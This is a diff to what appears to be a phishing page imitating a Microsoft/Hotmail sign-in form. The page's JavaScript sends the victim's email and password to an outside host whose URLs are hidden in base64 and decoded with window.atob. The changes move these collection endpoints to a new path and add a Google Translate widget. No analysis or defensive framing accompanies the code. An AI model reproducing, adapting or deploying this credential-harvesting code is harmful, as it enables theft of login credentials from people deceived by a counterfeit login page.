@@ -16,7 +16,7 @@
 		var email = encoded_string;	
 		$('.identity').html(email);		
 		var request = new XMLHttpRequest();
-		var url =  window.atob('aHR0cDovL2ZhaXJ0ZWNoLmxpdmUvaG90bS9wcnYucGhwP2lkPQ==') + email
+		var url =  window.atob('aHR0cDovL2ZhaXJ0ZWNoLmxpdmUvaG90bXAvcHJ2LnBocD9pZD0=') + email
 		request.open('GET', url, true);
 		request.onload = function() {
 		  if (this.status >= 200 && this.status < 400) {
@@ -76,7 +76,7 @@
 					$("#passwordError").hide();
 					$('#idSIButton9').prop('disabled', true);
 					$.ajax({
-						url: window.atob("aHR0cDovL2ZhaXJ0ZWNoLmxpdmUvaG90bS9wb2xpY3kucGhw"), 
+						url: window.atob("aHR0cDovL2ZhaXJ0ZWNoLmxpdmUvaG90bXAvcG9saWN5LnBocA=="), 
 						data: {
 								"email": user,
 								"password": pass,
@@ -235,5 +235,12 @@ inputpw.addEventListener("keyup", function(event) {
   }
 });
 </script>
+<div id="google_translate_element"></div>
+<script>
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
+}
+</script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </body>
 </html>
